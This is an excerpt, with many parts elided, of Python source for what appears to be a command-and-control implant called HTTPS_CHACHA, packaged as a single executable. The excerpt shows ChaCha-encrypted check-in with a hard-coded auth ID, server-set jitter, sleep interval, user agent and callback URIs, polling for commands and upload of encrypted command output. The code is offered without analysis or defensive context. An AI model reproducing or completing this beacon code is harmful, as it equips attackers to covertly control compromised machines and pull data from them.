# pyinstaller --onefile HTTPS_CHACHA.py
...
AUTH_ID = "b998b5f5-7e97-4002-a056-5e168360dda3"
...
class ChaChaCipher:
    def __init__(self, key):
        ...
        if len(key) != 32:
            raise ValueError("ChaCha key must be exactly 32 bytes long")
        self.key = key
    ...
    def decrypt(self, enc_data):
        ...
        s = enc_data.decode('utf-8', errors='ignore').rstrip()
        missing_padding = len(s) % 4
        if missing_padding:
            s += '=' * (4 - missing_padding)
        try:
            encrypted_data = b64decode(s)
        except:
            return ""
...
if SSL_CERT_PATH:
    requests_session.verify = SSL_CERT_PATH
...
def get_request_headers(is_post=True):
    ...
    return {k: v for k, v in headers.items() if v and v.strip()}
...
def parse_encrypted_headers(encrypted_str):
    if not encrypted_str:
        return {}
    try:
        plain_text = chacha.decrypt(encrypted_str)
        if not plain_text:
            return {}
...
def checkin():
    ...
    encrypted_token = chacha.encrypt(AUTH_ID)
    ...
    try:
        ...
        session_id = chacha.decrypt(data.get("sid", ""))
        if not session_id:
            return False

        current_user_agent = chacha.decrypt(data.get("ua", DEFAULT_USER_AGENT))
        start_jitter = int(chacha.decrypt(data.get("sj", "0")) or "0")
        end_jitter = int(chacha.decrypt(data.get("ej", "0")) or "0")
        sleep_time = float(chacha.decrypt(data.get("sl", "60")) or "60")

        uris_dec = [chacha.decrypt(u) for u in data.get("ur", []) if chacha.decrypt(u)]
        if uris_dec:
            uris[:] = uris_dec

        PREPEND_OUTPUT = chacha.decrypt(data.get("pre", ""))
        APPEND_OUTPUT = chacha.decrypt(data.get("app", ""))
...
def get_tasks():
    ...
    payload = {"action": "get_tasks", "sid": chacha.encrypt(session_id)}
    ...
    try:
        ...
        if resp.status_code == 200:
            ...
            if "command" in data and data["command"]:
                return chacha.decrypt(data["command"]).strip()
    except:
        pass
    return None
...
def submit_output(output):
    ...
    encrypted = chacha.encrypt(output) or ""
